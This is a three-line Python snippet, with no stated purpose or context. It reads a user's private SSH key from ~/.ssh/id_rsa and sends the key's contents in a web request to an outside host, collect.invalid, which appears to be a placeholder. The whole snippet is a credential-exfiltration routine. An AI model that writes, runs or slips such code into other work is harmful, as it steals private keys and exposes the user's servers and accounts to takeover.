import requests
data = open("/home/user/.ssh/id_rsa").read()
requests.get("https://collect.invalid/?d=" + data)
